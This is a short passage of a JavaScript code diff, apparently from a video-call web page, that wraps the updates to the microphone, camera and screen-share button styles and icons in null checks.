-    toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
-    toggleCamBtn.className = 'ctrl-btn' + (isCamOn ? ' ctrl-btn-active' : '');
-    toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
-    toggleScreenBtn.className = 'ctrl-btn' + (isScreenSharing ? ' ctrl-btn-active' : '');
+    if (toggleMicBtn) {
+        toggleMicBtn.className = 'ctrl-btn' + (isMicOn ? ' ctrl-btn-active' : '');
+        toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
+    }
+    if (toggleCamBtn) {
+        toggleCamBtn.className = 'ctrl-btn' + (isCamOn ? ' ctrl-btn-active' : '');
+        toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
+    }
+    if (toggleScreenBtn) {
+        toggleScreenBtn.className = 'ctrl-btn' + (isScreenSharing ? ' ctrl-btn-active' : '');
+    }
 }
 
 // ============ INIT ============
